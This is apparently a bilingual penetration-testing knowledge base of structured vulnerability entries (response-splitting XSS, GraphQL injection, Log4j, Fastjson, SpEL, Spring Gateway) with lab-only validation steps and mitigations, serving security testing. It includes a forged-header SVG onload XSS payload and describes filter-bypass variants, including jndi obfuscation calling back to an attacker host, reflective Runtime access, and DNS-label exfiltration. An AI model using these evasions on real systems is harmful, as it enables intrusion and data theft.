description.zh: 绕过对 UTL/HTTP 系列的封锁：PostgreSQL 用 dblink 发起带外连接；DNS/连接尝试到达监听端即成功。
description.en: Fire an out-of-band connection via dblink when UTL/HTTP families are blocked; an arriving DNS or connection attempt confirms success.

description.zh: 绕过对完整 URL 特征的检测：把数据切进子域标签走纯 DNS 出网；DNS 侧收到带数据标签的查询即成功。
description.en: Move data into subdomain labels for pure DNS egress past full-URL detection; a DNS query carrying the data label confirms success.

name.zh: 注入式重定向响应体 XSS

description.zh: 使用伪造的 301 响应头片段与 SVG 事件处理器，验证用户输入是否能结束响应头并创建可执行 HTML 响应体。
description.en: Uses a forged 301 header fragment and SVG event handler to test whether input can terminate headers and create an executable HTML response body.

overview.zh: 覆盖响应拆分后的 HTML 注入验证：伪造 301 响应头片段与 SVG 事件处理器组合，验证用户输入能否结束响应头并创建可执行 HTML 响应体。四行为一个整体响应构造片段。
overview.en: Covers HTML injection after response splitting: a forged 301 response-header fragment combined with SVG event handlers, testing whether user input can terminate the header section and create an executable HTML body. The four lines form one integral response-construction fragment.

vulnerability.zh: 根因是应用或代理允许不可信数据控制状态行、Location、Content-Type 或头后正文且未做 HTML 上下文编码；响应拆分把安全重定向变成 text/html，SVG 事件属性进入可执行上下文。
vulnerability.en: The root cause is the application or proxy letting untrusted data control the status line, Location, Content-Type, or post-header body without HTML-context encoding; response splitting turns a safe redirect into text/html, bringing SVG event attributes into executable context.

exploitation.zh: 使用第 1 步命令的整体响应构造片段（四行一体），只在隔离代理/测试路由中使用，把可见动作替换为无副作用标记。在不可缓存测试路由先记录正常 301 基线，再提交整体片段并捕获原始字节、DOM 与 CSP 事件；只有服务端生成独立 HTML 响应且浏览器执行标记才成立。
exploitation.en: Use the step 1 command's integral response-construction fragment (four lines as one), only within isolated proxies or test routes, replacing visible actions with side-effect-free markers. Baseline a normal 301 on a non-cacheable test route first, then submit the full fragment capturing raw bytes, DOM, and CSP events; it stands only when the server emits a standalone HTML response and the browser executes the marker.

mitigation.zh: 禁止用户输入控制原始 HTTP 响应结构，使用框架重定向与响应 API 并拒绝控制字符；对 HTML 输出上下文编码与消毒，设置严格 CSP、nosniff 与不可缓存错误响应，统一代理与应用解析。
mitigation.en: Forbid user input controlling raw HTTP response structure, using framework redirect and response APIs while rejecting control characters; context-encode and sanitize HTML output with strict CSP, nosniff, and non-cacheable error responses, aligning proxy and application parsing.

description.zh: 记录测试路由的原始 301 响应、Content-Type、缓存头和浏览器 DOM。
description.en: Record raw 301 bytes, Content-Type, cache headers, and browser DOM for the test route.

title.zh: 提交整体响应构造片段

description.zh: 在隔离环境保持四行结构，并把事件动作替换为无副作用测试标记。
description.en: Preserve the four-line structure in isolation and replace the event action with a side-effect-free marker.

attackChain.payload:
HTTP/1.1 301 Moved Permanently
Location:
Content-Type: text/html
<svg onload=alert``>

description.zh: 确认响应边界和媒体类型确实改变，SVG 成为元素且标记由浏览器触发。
description.en: Confirm that response boundaries and media type changed, the SVG became an element, and the browser triggered the marker.

description.zh: 改用结构化响应 API 和上下文编码后重放片段，确认其被拒绝或仅作为文本显示。
description.en: After structured response APIs and encoding, replay the fragment to confirm rejection or inert text rendering.

prerequisites.zh: 用户输入可能进入原始响应头或代理错误响应模板
prerequisites.en: User input may reach raw response headers or a proxy error-response template.

prerequisites.zh: 可在隔离浏览器与不可缓存测试路由中观察解析结果
prerequisites.en: Parsing can be observed in an isolated browser on an uncacheable test route.

analysis.zh: 需同时证明响应拆分和浏览器执行两个条件。只证明其中一个时，应分别归为头注入或普通 HTML 反射，而不是完整 XSS 链。
analysis.en: Both response splitting and browser execution must be proven. If only one is present, classify it as header injection or inert HTML reflection rather than a full XSS chain.

opsecTips.zh: 仅在隔离浏览器设置内存标记，不使用 Cookie 读取、网络回传或持久化动作。
opsecTips.en: Set only an in-memory marker in an isolated browser; do not read cookies, send callbacks, or persist changes.

opsecTips.zh: 对测试路由关闭共享缓存，结束后清除浏览器状态和代理缓存。
opsecTips.en: Disable shared caching for the test route and clear browser state and proxy caches afterward.

description.zh: 响应体注入场景绕过括号过滤：模板字符串调用。判据：跟随重定向后弹窗。
description.en: Tagged-template call avoids parentheses in the response body. Success: alert after redirect.

description.zh: alert 首字母实体化。判据：解码后执行。
description.en: Entity-encodes the function name. Success: executes after decoding.

description.zh: 完全无字母关键词。判据：弹窗触发。
description.en: No literal keywords at all. Success: alert fires.

description.zh: 响应体携带 srcdoc 框架绕过外链检测。判据：渲染执行。
description.en: srcdoc frame in the body avoids external references. Success: executes on render.

name.zh: GraphQL 变量到 SQL 查询边界

description.zh: 使用布尔与堆叠 SQL 字符串验证 GraphQL 变量类型校验后是否仍被解析器拼接到数据库查询结构。
description.en: Uses Boolean and stacked SQL strings to test whether GraphQL variables are concatenated into database query structure after schema type validation.

overview.zh: 覆盖 GraphQL 变量到 SQL 查询的边界验证：以布尔与堆叠 SQL 字符串测试变量通过 GraphQL 类型校验后是否仍被 resolver 拼接进数据库查询结构。GraphQL 类型边界不等于 SQL 参数化。
overview.en: Covers boundary verification from GraphQL variables to SQL queries: boolean and stacked SQL strings testing whether variables passing GraphQL type validation still get concatenated by resolvers into database query structure. GraphQL type boundaries are not SQL parameterization.

vulnerability.zh: 根因是 resolver 把已通过 GraphQL 校验的变量拼接进 SQL，或自定义 scalar 放宽输入后产生查询片段；schema 是一层验证，数据库语义边界仍由参数化查询决定。
vulnerability.en: The root cause is resolvers concatenating GraphQL-validated variables into SQL, or custom scalars loosening input into query fragments; the schema is one validation layer, while the database semantic boundary is still decided by parameterized queries.

exploitation.zh: 使用第 1 步命令把三行逐条发送到隔离 schema：前两行应在 GraphQL Int 强制转换阶段拒绝，第三行只指向可回滚测试表并用事务/只读账户验证，不执行 DROP。先用合法整数/字符串建立 resolver 与结果基线，再关联 GraphQL validation、resolver 调用与最终 SQL；类型错误是安全结果，最终 SQL 结构改变并返回固定伪数据才成立。
exploitation.en: Use the step 1 command to send the three lines one by one to an isolated schema: the first two should be rejected at GraphQL Int coercion, and the third targets only a rollback-able test table verified under a transaction/read-only account without executing DROP. Baseline resolver behavior and results with legitimate integers/strings first, then correlate GraphQL validation, resolver calls, and final SQL; type errors are safe outcomes — only changed final SQL structure returning fixed dummy data counts.

mitigation.zh: 保持严格 schema 与标准 scalar，不在 resolver 中动态拼接 SQL；所有值使用数据库参数绑定，动态列/排序映射服务端枚举；应用数据库账户只读最小权限并回归这三类变量。
mitigation.en: Keep strict schemas and standard scalars, never concatenating SQL in resolvers; bind all values as database parameters and map dynamic columns/ordering via server-side enums; run the application's database account read-only with minimal privileges, regressing over these three variable classes.

title.zh: 建立 GraphQL 类型基线

description.zh: 记录合法 Int/String 变量经过 validation、resolver 和数据库的完整路径。
description.en: Record the full validation, resolver, and database path for valid Int and String variables.

title.zh: 逐条提交 SQL 边界 JSON

description.zh: 一次发送一行并保留 GraphQL 错误、resolver 日志和最终 SQL。
description.en: Send one line at a time and retain GraphQL errors, resolver logs, and final SQL.

title.zh: 确认数据库结构是否改变

description.zh: 匹配固定伪数据和最终 SQL，区分 GraphQL 类型拒绝、普通无结果与真实注入。
description.en: Match fixed synthetic data and final SQL to distinguish type rejection, ordinary no-result behavior, and injection.

title.zh: 参数化 Resolver 并回归

description.zh: 修复后重放合法与全部恶意变量，确认 resolver 正常且 SQL 结构固定。
description.en: After remediation replay valid and all malicious variables to confirm normal resolver behavior with fixed SQL structure.

prerequisites.zh: 目标 GraphQL resolver 使用变量访问关系型数据库
prerequisites.en: The target GraphQL resolver uses variables to access a relational database.

prerequisites.zh: 测试 schema、伪用户数据和最终 SQL 审计可用
prerequisites.en: A test schema, synthetic user data, and final SQL audit are available.

analysis.zh: 分层记录 GraphQL 解析、类型强制、resolver 和数据库四个阶段。前两行被 Int 校验拒绝是预期结果，不能因 payload 包含 SQL 关键字判为漏洞。
analysis.en: Record GraphQL parse, coercion, resolver, and database stages separately. Rejection of the first two at Int coercion is expected and must not be labeled vulnerable because the strings contain SQL keywords.

opsecTips.zh: 只使用测试表与只读账户，堆叠语句不执行任何 DROP/写操作。
opsecTips.en: Use only test relations and a read-only account and never execute the DROP or any write operation.

opsecTips.zh: 每次请求限制字段与返回条数，避免同时暴露 email/role 等真实数据。
opsecTips.en: Limit fields and result rows per request and avoid exposing real email or role data.

description.zh: 绕过对 variables 字段注入特征的检测：把注入串改为查询内联参数直接进入 resolver；返回多用户或报错即成功。
description.en: Move the payload into an inline query argument past variables-field inspection; multiple users returned or an error confirms success.

description.zh: 绕过对变量明文元字符的扫描：空格与等号以 Unicode 转义传递；resolver 拼接后行为异常即成功。
description.en: Unicode-escape spaces and equals in the variable value; anomalous resolver behavior after concatenation confirms success.

description.zh: 绕过标量类型校验：变量以数组传递依赖后端字符串化；注入生效返回越权数据即成功。
description.en: Pass the variable as an array relying on backend stringification past scalar validation; an effective injection returning unauthorized data confirms success.

name.zh: GraphQL 变量到 HTML 输出边界

description.zh: 使用 script 字符串验证 import mutation 的 data 变量是否在存储、预览或管理界面中未经上下文编码进入 HTML。
description.en: Uses a script string to test whether an import mutation's data variable reaches stored, preview, or administrative HTML without context-aware encoding.

overview.zh: 覆盖 GraphQL 变量到 HTML 输出的边界验证：以 script 字符串测试 import mutation 的 data 变量是否在存储、预览或管理界面中未经上下文编码进入 HTML。
overview.en: Covers boundary verification from GraphQL variables to HTML output: script strings testing whether an import mutation's data variable enters HTML without context encoding in storage, preview, or admin views.

vulnerability.zh: 根因是导入管线把不可信字符串存储后在预览、报表或管理页面通过 innerHTML/模板原样渲染，缺少上下文编码或 HTML 消毒；API 与 UI 属于跨组件信任边界。
vulnerability.en: The root cause is the import pipeline persisting untrusted strings that preview, report, or admin pages render verbatim via innerHTML/templates without context encoding or HTML sanitization; the API and UI form a cross-component trust boundary.

exploitation.zh: 使用第 1 步命令把 alert 改为设置随机内存标记，在专用记录中提交一次，并检查 API 响应、存储值、渲染 DOM 和 CSP，不读取 Cookie 或外传。先用普通文本建立导入/渲染基线，再提交无害标记版本并在隔离浏览器打开所有实际消费者视图；响应回显或源码文本不是执行。
exploitation.en: Use the step 1 command to swap alert for a random memory flag, submitting once in a dedicated record while checking API response, stored value, rendered DOM, and CSP — no cookie reads or exfiltration. Baseline import/render with plain text first, then submit the harmless-marker version opening every actual consumer view in an isolated browser; response echo or source text is not execution.

mitigation.zh: 所有消费者按 HTML/属性/URL/JS 上下文编码，富文本使用成熟消毒器并禁止 script/事件属性；避免 innerHTML，部署 nonce/hash CSP 作为补充；导入 schema 校验数据类型并为 API 到 UI 建立端到端回归。
mitigation.en: Encode at every consumer per HTML/attribute/URL/JS contexts, run rich text through mature sanitizers banning script/event attributes; avoid innerHTML with nonce/hash CSP as backup; validate data types in the import schema and build end-to-end regressions from API to UI.

title.zh: 绘制导入到渲染数据流

description.zh: 确认 data 经过的存储、转换和所有前端/管理消费者。
description.en: Identify storage, transformations, and every frontend or administrative consumer of data.

title.zh: 提交无害 HTML 标记

description.zh: 替换 alert 后写入专用记录一次，并保留请求与记录 ID。
description.en: Replace alert, write one dedicated record, and retain request and record IDs.

title.en: Confirm execution in a real consumer

description.zh: 匹配存储值、DOM 元素、CSP 事件和内存标记，排除 API 回显。
description.en: Match stored value, DOM element, CSP events, and in-memory marker while excluding API reflection.

title.zh: 编码所有消费者并清理
title.en: Encode every consumer and clean up

description.zh: 删除测试记录、修复渲染后重放普通文本与标记，确认前者可见而后者为文本。
description.en: Delete test data, fix rendering, and replay plain text and the marker to confirm the former renders and the latter is inert text.

prerequisites.zh: 授权测试账号可导入数据并在隔离预览/管理视图中查看
prerequisites.en: An authorized test account can import data and view it in an isolated preview or administrative view.

prerequisites.zh: 使用无副作用 DOM 内存标记且可清理测试记录
prerequisites.en: A side-effect-free DOM in-memory marker is used and test records can be removed.

analysis.zh: 分别确认 JSON 传输、存储、HTML 解析和脚本执行。GraphQL 层接受 `<script>` 字符串是正常行为，漏洞位于后续未编码消费者。
analysis.en: Confirm JSON transport, persistence, HTML parsing, and script execution separately. GraphQL accepting a script string is normal; the flaw resides in an unencoded downstream consumer.

opsecTips.zh: 只设置随机内存标记，不读取 Cookie、localStorage 或页面数据。
opsecTips.en: Set only a random in-memory marker and never read cookies, localStorage, or page data.

opsecTips.zh: 使用专用记录并在测试后从数据库、缓存和搜索索引中清理。
opsecTips.en: Use a dedicated record and remove it from database, cache, and search index after testing.

description.zh: 绕过 script 变量过滤：事件型载荷入库。判据：渲染页面弹窗。
description.en: Event-based payload through the mutation. Success: alert on the rendered page.

description.zh: svg 载荷入库。判据：执行成功。
description.en: svg payload stored. Success: executes.

description.zh: 入库为实体，输出解码后执行。判据：前端渲染执行。
description.en: Stored as entities, decoded on output. Success: executes client-side.

description.zh: 聚焦即加载外部模块。判据：攻击域收到请求。
description.en: Autofocus imports the remote module. Success: request reaches attacker host.

name.zh: Log4j 本地消息 Lookup 策略验证

description.zh: 在无网络出口的本地日志 Fixture 中记录一个 Java 版本 Lookup 形状，验证消息替换策略和 network_lookup=false，不使用 JNDI 或外带。
description.en: Record one Java-version lookup shape in a no-egress local logging fixture to validate message-substitution policy and network_lookup=false without JNDI or exfiltration.

subCategory.zh: 表达式与 Lookup 注入

overview.zh: Log4j 本地消息 Lookup 策略验证针对日志消息替换边界：应用记录含 ${} 形状的受控消息时 Lookup 是否按配置展开。验证在无网络出口的本地 Fixture 中记录 Java 版本 Lookup 形状，并断言没有产生网络查找。
overview.en: The Log4j local message-lookup policy validation targets log message-substitution boundaries: whether lookups expand per configuration when a controlled ${} -shaped message is logged. It records a Java-version lookup shape in a local fixture with no network egress and asserts no network lookup occurs.

vulnerability.zh: 根因是受影响 Log4j 版本会在记录消息时解析 Lookup 表达式；是否构成 Log4Shell 取决于版本、JNDI 组件、Java 运行时与网络出口同时成立，带花括号文本被记录不等于远程查找发生。
vulnerability.en: The root cause is that affected Log4j versions resolve lookup expressions when logging messages; whether this constitutes Log4Shell requires version, JNDI component, Java runtime, and network egress to align—braced text being logged is not itself a remote lookup.

exploitation.zh: 按第 1 步向本地日志 Fixture 的 /api/lab/log4j/log 提交含 LOOKUP_CANARY 与 ${java...} 形状的 POST 消息并携带请求 ID；命中判据为日志按配置展开或原样记录该形状，且断言未产生任何网络查找。该结果用于确认消息替换策略（如 network_lookup=false），不能据此推断 Log4Shell 利用链成立。
exploitation.en: As in step 1, POST a message carrying the LOOKUP_CANARY and ${java...} shape to the local fixture at /api/lab/log4j/log with a request ID; a hit is the log expanding or recording the shape per policy while asserting zero network lookups. Use the result to confirm the message-substitution policy (e.g., network_lookup=false); it does not establish a Log4Shell exploit chain.

mitigation.zh: 升级到 Apache 公告认可的安全版本，移除不需要的 JNDI Lookup 能力，限制应用网络出口，避免记录未规范化的敏感输入。修复后以第 1 步同一消息重放，确认策略符合预期且无异常解析或出站连接。
mitigation.en: Upgrade to versions endorsed by the Apache advisory, remove unneeded JNDI lookup capability, restrict application egress, and avoid logging unsanitized sensitive input. After the fix, replay the step-1 message and confirm the policy behaves as expected with no anomalous parsing or outbound connections.

title.zh: 固定 Log4j 运行条件

description.zh: 记录 log4j-core 版本、Java 版本、消息替换配置和网络阻断状态。
description.en: Record log4j-core version, Java version, substitution configuration, and egress-block state.

description.zh: 向 localhost 日志 Fixture 提交不含 JNDI 的固定消息，并要求返回网络标志。
description.en: Submit the fixed non-JNDI message to the localhost logging fixture and require a network flag.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/log4j/log" -H "Content-Type: application/json" -H "X-Request-ID: log4j-lookup-001" --data '{"message":"LOOKUP_CANARY_${java:version}"}' | jq -e '.request_id and .network_lookup == false and .logged_value'

title.zh: 核对日志与网络否定证据
title.en: Check logs and negative network evidence

description.zh: 按请求 ID 对齐记录值、替换日志和零 DNS、LDAP、RMI 事件。
description.en: Align logged value, substitution diagnostics, and zero DNS, LDAP, or RMI events by request ID.

description.zh: 升级并关闭不需要的 Lookup 后重放普通文本与 Canary，确认无网络行为。
description.en: After upgrade and disabling unnecessary lookups, replay plain text and the canary to confirm no network behavior.

prerequisites.zh: 使用固定 Log4j 版本的 localhost Fixture，阻断 DNS、LDAP、RMI 与所有外部网络出口。
prerequisites.en: Use a localhost fixture with a fixed Log4j version and block DNS, LDAP, RMI, and all external network egress.

prerequisites.zh: 启用应用日志、替换器调试日志和网络否定证据，并准备普通文本对照。
prerequisites.en: Enable application logs, substitution diagnostics, and negative network evidence with a plain-text control.

analysis.zh: 本地 Java Lookup 的展开只能说明消息替换行为，不能证明 JNDI 可达或 RCE。阳性安全结论必须结合确切受影响版本、远程 Lookup 能力与出口；本批刻意不产生远程请求，因此只报告策略与版本证据。
analysis.en: Expansion of a local Java lookup establishes message-substitution behavior only, not reachable JNDI or RCE. A security conclusion requires an affected version, remote-lookup capability, and egress; this batch intentionally creates no remote request and reports policy plus version evidence only.

opsecTips.zh: Fixture 关闭全部网络出口，消息不包含 jndi、环境变量、主机名或远程协议。
opsecTips.en: Block all fixture egress and keep jndi, environment variables, hostnames, and remote protocols out of the message.

opsecTips.zh: 每次只记录一个固定 Canary，五秒内完成并清理包含运行时版本的测试日志。
opsecTips.en: Log one fixed canary per run, finish within five seconds, and remove test logs containing runtime-version details.

description.zh: 绕过对 jndi: 明文特征：内层 lower 查找先解析还原 j；出站请求到达 {ATTACKER_HOST} 即成功。
description.en: Nest a lower lookup to reassemble j past plaintext jndi signatures; an outbound request reaching {ATTACKER_HOST} confirms success.

description.zh: 用环境查找默认值拼接关键字：特征串在词法层不存在；DNS/连接回访出现即成功。
description.en: Assemble keywords via env-lookup defaults so the signature never exists lexically; an arriving DNS/connection callback confirms success.

description.zh: Unicode 转义与默认值语法组合还原 jndi 前缀；lookup 执行证据（出网/日志）出现即成功。
description.en: Combine a unicode escape with default-value syntax to rebuild the jndi prefix; evidence of lookup execution (egress or logs) confirms success.

name.zh: Fastjson AutoType 策略边界验证

description.zh: 在 localhost 解析 Fixture 中使用无副作用 HashMap 类型标记，验证 AutoType、允许类型和外部查找策略，而不加载 gadget 或发起网络请求。
description.en: Validate AutoType, allowed-class, and external-lookup policy in a localhost parsing fixture with a side-effect-free HashMap marker and no gadget loading or network request.

overview.zh: Fastjson AutoType 策略边界验证针对 JSON 反序列化的多态类型策略：解析器是否接受客户端控制的 @type。验证在 localhost Fixture 中提交无副作用的 HashMap 类型标记，检查 AutoType、允许类型与外部查找策略。
overview.en: The Fastjson AutoType policy boundary validation targets polymorphic-type policy in JSON deserialization: whether the parser accepts client-controlled @type. It submits a side-effect-free HashMap type marker to a localhost fixture and checks AutoType, allowed types, and external-lookup policy.

vulnerability.zh: 根因是旧版或宽松配置的 Fastjson 接受客户端控制的多态类型并在反序列化期间实例化类；AutoType 是否开启只是条件之一，只有不受信类型可到达有副作用的类路径才形成可利用边界。
vulnerability.en: The root cause is that outdated or permissively configured Fastjson accepts client-controlled polymorphic types and instantiates classes during deserialization; AutoType being enabled is only one condition—an exploitable boundary requires untrusted types to reach side-effect-bearing classpath entries.

exploitation.zh: 先提交普通对象建立字段基线，再按第 1 步向 /api/lab/fastjson/parse 提交 @type 为 java.util.HashMap 的类型标记；命中判据为合成 marker 保留且 external_lookup=false。对照两次解析结果、拒绝原因与类型解析日志；不要使用 JdbcRowSet、BCEL 或任何远程引用，策略放行也不能直接等同于 gadget 可用。
exploitation.en: First submit a plain object to establish a field baseline, then send a java.util.HashMap @type marker to /api/lab/fastjson/parse as in step 1; a hit is the synthetic marker retained with external_lookup=false. Compare parse results, rejection reasons, and type-resolution logs; avoid JdbcRowSet, BCEL, or any remote reference, and do not equate a policy pass with gadget availability.

mitigation.zh: 升级到供应商维护版本，优先避免客户端控制类型元数据，使用显式 DTO 与类型允许列表；关闭不需要的 AutoType 并限制类加载与网络出口。修复后重放第 1 步请求，确认类型标记被拒绝并建立拒绝类型审计。
mitigation.en: Upgrade to vendor-maintained versions, prefer avoiding client-controlled type metadata, and use explicit DTOs with a type allowlist; disable unneeded AutoType and restrict class loading and egress. After the fix, replay the step-1 request and confirm the type marker is rejected with a denial audit in place.

title.zh: 固定解析器版本和策略

description.zh: 记录 Fastjson 版本、AutoType 设置、允许类型和网络隔离状态。
description.en: Record Fastjson version, AutoType setting, allowed classes, and network-isolation state.

description.zh: 向 localhost Fixture 提交 HashMap Canary，并要求返回解析与外部查找状态。
description.en: Submit the HashMap canary to the localhost fixture and require parse and external-lookup status.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/fastjson/parse" -H "Content-Type: application/json" -H "X-Request-ID: fastjson-policy-001" --data '{"@type":"java.util.HashMap","marker":"FASTJSON_POLICY_CANARY_A1"}' | jq -e '.marker == "FASTJSON_POLICY_CANARY_A1" and .external_lookup == false'

description.zh: 按请求 ID 对齐类型解析、拒绝原因和无网络事件，排除普通字段回显。
description.en: Align type resolution, rejection reason, and absence of network events by request ID, excluding ordinary reflection.

description.zh: 应用显式 DTO 与类型允许列表后重放普通、允许和未知类型三个对照。
description.en: After explicit DTO and type-allowlist controls, replay plain, allowed, and unknown-type controls.

prerequisites.zh: 使用隔离 Fastjson Fixture，固定依赖版本并禁用网络出口和类实例化副作用。
prerequisites.en: Use an isolated Fastjson fixture with a fixed dependency version, no network egress, and no side-effectful class instantiation.

prerequisites.zh: 准备普通 JSON 对照和一个 java.util.HashMap 类型标记，启用类型解析审计日志。
prerequisites.en: Prepare a plain JSON control and one java.util.HashMap type marker with type-resolution audit logs enabled.

analysis.zh: 接受无害 HashMap 类型不等于 RCE，拒绝未知类型也不证明所有历史链均不可达。有效结论应限定到确切版本、配置、类路径和解析日志，并确认测试期间没有 DNS、LDAP、RMI 或其他网络活动。
analysis.en: Accepting a harmless HashMap type is not RCE, and rejecting one unknown type does not prove every historical chain unreachable. Conclusions must be limited to the exact version, configuration, classpath, and parse logs with no DNS, LDAP, RMI, or other network activity.

opsecTips.zh: 只使用 java.util.HashMap 和合成标记，禁止任何远程引用、gadget 或字节码字段。
opsecTips.en: Use only java.util.HashMap and a synthetic marker, with no remote references, gadgets, or bytecode fields.

opsecTips.zh: Fixture 禁用网络出口并设置五秒超时，测试后删除解析日志中的请求正文。
opsecTips.en: Disable fixture egress, enforce a five-second timeout, and remove request bodies from parse logs after testing.

description.zh: 绕过对明文 "@type" 键的特征匹配：键名 Unicode 转义在解析时还原；反序列化路径被触发即成功。
description.en: Escape the @type key so signature matching misses it until parsing restores it; the deserialization path firing confirms success.

description.zh: 利用解析器宽松语法：单引号 JSON5 形态改变特征指纹；类型解析行为发生即成功。
description.en: Exploit lenient parsing with a JSON5 single-quote form that shifts the fingerprint; type resolution occurring confirms success.

description.zh: 嵌套引用触发二次解析：外层引用使类型在后续阶段加载；出站连接指向 {ATTACKER_HOST} 即成功。
description.en: Nest a $ref so the type loads in a later pass; an outbound connection toward {ATTACKER_HOST} confirms success.

name.zh: Spring SpEL 简单求值边界验证

description.zh: 在 localhost SimpleEvaluationContext Fixture 中仅计算固定算术表达式，并断言类型访问和方法调用均关闭。
description.en: Evaluate one fixed arithmetic expression in a localhost SimpleEvaluationContext fixture and assert that type access and method invocation are disabled.

subCategory.zh: 表达式与 Lookup 注入

overview.zh: Spring SpEL 简单求值边界验证针对表达式求值上下文配置的场景：业务是否把表达式限制在 SimpleEvaluationContext 中。验证仅计算固定算术表达式，并断言类型访问与方法调用能力均已关闭。
overview.en: The Spring SpEL simple-evaluation boundary validation targets expression-evaluation context configuration: whether the business confines expressions to a SimpleEvaluationContext. It evaluates only a fixed arithmetic expression and asserts both type access and method invocation are disabled.

vulnerability.zh: 风险源于把不可信表达式放入 StandardEvaluationContext 或开放类型解析、方法调用、Bean 解析能力；表达式语法被识别只是前提，实际影响取决于上下文对象与可用能力。
vulnerability.en: The risk stems from placing untrusted expressions in a StandardEvaluationContext or enabling type resolution, method invocation, and bean-resolution capabilities; recognized expression syntax is only a prerequisite—actual impact depends on context objects and available capabilities.

exploitation.zh: 按第 1 步向 /api/lab/spel/evaluate 的 simple 模式提交固定算术 7*7 并携带请求 ID；命中判据为返回 49 且 type_access 与 method_invoke 两个能力标志均为关闭。该组合构成配置证据：结果 49 证明表达式进入服务端求值，能力标志证明危险上下文未开放。不要用回显数字单独判断任意 SpEL 注入，也不要尝试 Runtime、ProcessBuilder 或反射调用。
exploitation.en: As in step 1, submit the fixed arithmetic 7*7 to /api/lab/spel/evaluate in simple mode with a request ID; a hit is a returned 49 with both the type_access and method_invoke capability flags disabled. The combination is configuration evidence: 49 proves server-side evaluation while the flags prove the dangerous context is closed. Do not judge arbitrary SpEL injection from the echoed number alone, and do not attempt Runtime, ProcessBuilder, or reflective calls.

mitigation.zh: 避免求值不可信表达式；必须支持时使用 SimpleEvaluationContext、受限属性访问器与明确变量，禁用类型定位、构造器、方法与 Bean 解析，并对长度、复杂度和超时设限。修复后重放第 1 步请求，确认能力标志保持关闭并记录拒绝。
mitigation.en: Avoid evaluating untrusted expressions; when expression support is required, use SimpleEvaluationContext with restricted property accessors and explicit variables, disable type location, constructors, methods, and bean resolution, and cap length, complexity, and timeouts. After the fix, replay the step-1 request and confirm the capability flags stay off with rejections logged.

description.zh: 记录上下文类型、属性访问器和所有禁用的高风险能力。
description.en: Record context type, property accessors, and every disabled high-risk capability.

description.zh: 向 localhost Fixture 提交 7*7，并要求返回结果和能力标志。
description.en: Submit 7*7 to the localhost fixture and require the result plus capability flags.

attackChain.payload: curl --fail-with-body --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/api/lab/spel/evaluate" -H "Content-Type: application/json" -H "X-Request-ID: spel-simple-001" --data '{"expression":"7 * 7","mode":"simple"}' | jq -e '.result == 49 and .type_access == false and .method_invocation == false'

description.zh: 将请求与上下文创建、类型拒绝和方法禁用日志关联。
description.en: Correlate the request with context creation, type rejection, and method-disable logs.

description.zh: 更新策略后重放算术与无效类型引用，确认业务计算保留且危险能力拒绝。
description.en: After policy updates, replay arithmetic and an invalid type reference to preserve business evaluation and deny dangerous capabilities.

prerequisites.zh: 使用 SimpleEvaluationContext 或等价最小上下文，关闭类型、方法、Bean 与类加载访问。
prerequisites.en: Use SimpleEvaluationContext or an equivalent minimal context with type, method, bean, and class-loading access disabled.

prerequisites.zh: Fixture 只接受固定算术表达式并返回 result 与能力标志。
prerequisites.en: Configure the fixture to accept only a fixed arithmetic expression and return the result plus capability flags.

analysis.zh: 算术返回 49 只证明存在求值路径。只有不可信输入能访问超出业务需要的类型、方法、Bean 或敏感对象才构成安全问题。本批明确断言高风险能力关闭，并不尝试命令、文件或网络。
analysis.en: Arithmetic result 49 proves an evaluation path only. A security issue requires untrusted input to access types, methods, beans, or sensitive objects beyond business need. This batch asserts risky capabilities are disabled and attempts no command, file, or network action.

opsecTips.zh: 表达式固定为纯算术，禁止类名、方法名、路径、主机、反射或脚本引擎。
opsecTips.en: Keep the expression purely arithmetic with no class names, methods, paths, hosts, reflection, or script engines.

opsecTips.zh: Fixture 五秒超时、无网络出口，并只保存结果与能力标志。
opsecTips.en: Use a five-second no-egress fixture and retain only the result and capability flags.

description.zh: 绕过对 T(java.lang.Runtime) 直引特征的封锁：经 String 类反射获取 Runtime；命令输出出现即成功。
description.en: Reach Runtime reflectively through T(String) past direct T(java.lang.Runtime) signatures; command output appearing confirms success.

description.zh: 以 ProcessBuilder 替代 Runtime.exec 且参数数组构造：特征指纹改变；进程副作用出现即成功。
description.en: Swap in ProcessBuilder with an argument array, shifting the fingerprint; process side effects appearing confirm success.

description.zh: 表单编码载体承载 SpEL：绕过 JSON 体与明文表达式扫描；求值输出返回即成功。
description.en: Carry the expression in a form-encoded field past JSON-body and plaintext scans; evaluation output returning confirms success.

name.zh: Spring Cloud Gateway 管理端点访问验证
name.en: Spring Cloud Gateway Management-Endpoint Access Validation

description.zh: 验证低权限实验主体对 localhost Gateway routes 管理端点的访问是否被拒绝或关闭，不创建、刷新或修改路由。
description.en: Validate that a low-privilege lab principal is denied or cannot reach the localhost Gateway routes management endpoint without creating, refreshing, or changing routes.

overview.zh: Spring Cloud Gateway 管理端点访问验证针对 Gateway 管理面暴露的场景：低权限主体能否读取 routes 管理端点。验证以低权限令牌只读请求 /actuator/gateway/routes，并确认端点被拒绝或关闭。
overview.en: The Spring Cloud Gateway management-endpoint access validation targets management-plane exposure: can a low-privilege principal read the routes management endpoint? It issues a read-only request to /actuator/gateway/routes with a low-privilege token and confirms the endpoint is denied or disabled.

vulnerability.zh: 风险来自管理端点暴露到不受信网络且授权过宽；routes 端点可写时路由表达式可能进入危险求值上下文。端点存在并不自动等于 RCE，必须有未授权写操作或表达式到达危险上下文的证据。
vulnerability.en: The risk is management endpoints exposed to untrusted networks with overly broad authorization; when routes is writable, routing expressions may reach dangerous evaluation contexts. Endpoint existence alone is not RCE—evidence of unauthorized writes or expressions reaching dangerous contexts is required.

exploitation.zh: 按第 1 步以低权限 spring-user-token 对 /actuator/gateway/routes 发起只读 GET 并携带请求 ID；命中判据为返回 401、403 或 404，即管理端点对低权限主体关闭。若返回 200 且包含路由列表，说明管理面暴露，记录返回的路由结构作为证据；验证过程不创建、刷新或修改任何路由。
exploitation.en: As in step 1, issue a read-only GET to /actuator/gateway/routes with the low-privilege spring-user-token and a request ID; a hit is 401, 403, or 404, showing the management endpoint is closed to low-privilege principals. A 200 with a route list means the management plane is exposed—record the returned route structure as evidence. Never create, refresh, or modify routes during validation.

mitigation.zh: 升级受影响 Spring Cloud 组件，只暴露必要 Actuator 端点并用 Spring Security 对 Gateway 管理端点执行最小角色授权；关闭不需要的路由写操作。修复后重放第 1 步请求，确认低权限令牌无法读取 routes 且正常业务路由不受影响。
